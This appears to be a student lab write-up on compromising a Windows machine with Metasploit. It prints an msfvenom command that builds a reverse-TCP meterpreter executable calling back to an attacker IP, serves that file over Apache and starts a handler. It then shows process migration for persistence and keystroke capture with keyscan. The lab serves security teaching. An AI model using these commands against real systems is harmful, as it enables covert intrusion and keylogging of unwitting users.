<img width="993" height="737" alt="image" src="https://github.com/user-attachments/assets/db6b6018-dbe5-443d-9b46-f86f776962a3" /># EX 06-Compromising-windows-using-Metasploit
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="731" height="582" alt="image" src="https://github.com/user-attachments/assets/0963a72c-7b5e-4224-b0ee-db3c15d3d4e9" />




Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="737" height="580" alt="image" src="https://github.com/user-attachments/assets/ab68267d-d848-40d8-953a-5a107a33c795" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="722" height="541" alt="image" src="https://github.com/user-attachments/assets/05ec241c-c7de-4847-98da-a1a615ccb3c1" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="725" height="520" alt="image" src="https://github.com/user-attachments/assets/2e52347a-8a2c-4a2a-b818-26ec28c14b08" />



Check the status of apache2
## OUTPUT:

<img width="717" height="561" alt="image" src="https://github.com/user-attachments/assets/02f0a257-bf8d-4da7-a7da-44fa8fb85313" />


Invoke msfconsole:
## OUTPUT:

<img width="717" height="555" alt="image" src="https://github.com/user-attachments/assets/10f6ebea-2f89-4a2e-8b9b-23207ba13d3e" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="956" height="863" alt="image" src="https://github.com/user-attachments/assets/637761b0-67dd-40cd-ab3a-9a08324d94eb" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1027" height="572" alt="image" src="https://github.com/user-attachments/assets/de608d80-bb21-4c44-8439-985ec3d228aa" />

## OUTPUT:

<img width="889" height="166" alt="image" src="https://github.com/user-attachments/assets/a6b9899d-26a8-46bb-aa4f-5506d6f44478" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="936" height="996" alt="image" src="https://github.com/user-attachments/assets/05d81998-b40c-4426-a9f6-b91bf3f0b277" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="342" height="69" alt="image" src="https://github.com/user-attachments/assets/216bc7fe-ac98-4b20-bb1e-6f044a438627" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="953" height="1000" alt="image" src="https://github.com/user-attachments/assets/3897fcc8-6fd8-4023-9ac0-0447c6c1c883" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="993" height="737" alt="image" src="https://github.com/user-attachments/assets/1d75c3b7-2445-40c5-ab84-a72496e4e49d" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="920" height="85" alt="image" src="https://github.com/user-attachments/assets/73680a53-773b-4424-aeef-792fa11681a4" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
